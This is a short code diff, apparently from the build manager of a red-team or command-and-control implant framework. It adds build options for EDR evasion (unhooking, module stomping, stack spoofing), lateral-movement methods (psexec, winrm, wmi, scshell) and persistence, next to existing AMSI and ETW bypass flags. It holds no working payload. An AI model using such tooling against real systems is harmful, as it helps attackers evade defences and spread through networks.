@@ -498,11 +498,25 @@ class BuildManager:
         cfg.inject_method = (
             params.get('inject_method') or 'default')
         cfg.identity_role = params.get('identity_role') or ''
+        cfg.unhook = bool(params.get('unhook', False))
+        cfg.stomp = bool(params.get('stomp', False))
+        cfg.stack_spoof = bool(params.get('stack_spoof', True))
         cfg.wasm_extensions = bool(
             params.get('wasm_extensions', False))
+        jump = params.get('jump_methods') or ''
+        if isinstance(jump, list):
+            jump = ','.join(jump)
+        valid_jump = {'psexec', 'winrm', 'wmi', 'scshell'}
+        for jm in [x.strip() for x in jump.split(',') if x.strip()]:
+            if jm not in valid_jump:
+                raise RuntimeError(f"unknown jump method {jm!r}")
+        cfg.jump_methods = jump
+        cfg.persistence = params.get('persistence') or ''
+        cfg.tags = params.get('tags') or ''
 
         ALLOWED_OVERRIDES = frozenset({
-            'antisanbox', 'amsi_bypass', 'etw_patch',
+            'antisanbox', 'amsi_bypass', 'etw_patch', 'unhook', 'stomp',
+            'stack_spoof',
             'sleep_mask', 'syscall_method', 'string_obfuscation',
             'garble', 'upx', 'ppid_spoof', 'antidebug', 'antivm',
             'verbose',
